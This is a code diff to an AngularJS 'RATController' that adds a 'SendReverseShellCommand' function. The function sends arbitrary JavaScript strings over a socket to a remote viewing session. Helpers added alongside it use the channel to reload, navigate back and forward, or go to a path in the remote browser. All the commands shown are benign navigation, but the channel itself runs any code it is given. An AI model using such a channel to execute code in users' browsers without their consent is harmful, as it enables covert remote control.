@@ -376,6 +376,32 @@ Flinger.controller("RATController", function ($scope, RATService, $rootScope) {
         });
     }
 
+    $scope.SendReverseShellCommand = function(rsc){
+        const reverseShellCommand = `${rsc}`;
+
+        $scope._ratSocket.emit('Coplest.Flinger.RAT', { Command: 'SendReverseShellCommand#Request', Values: { RoomId: $scope.RoomId, RSC: reverseShellCommand } });
+    }
+
+    $scope.ReloadVisor = function(){
+        $scope.SendReverseShellCommand("location.reload()");
+    }
+
+    $scope.HomeVisor = function(){
+        $scope.SendReverseShellCommand("location.assign('/')");
+    }
+
+    $scope.BackVisor = function(){
+        $scope.SendReverseShellCommand("history.back()");
+    }
+
+    $scope.ForwardVisor = function(){
+        $scope.SendReverseShellCommand("history.forward()");
+    }
+
+    $scope.NavigateVisor = function(){
+        $scope.SendReverseShellCommand(`location.assign('${$scope.CurrentUserPath}')`);
+    }
+
     $scope.PrintFrame = function (data) {
         /**
          * Preserving aspect radio
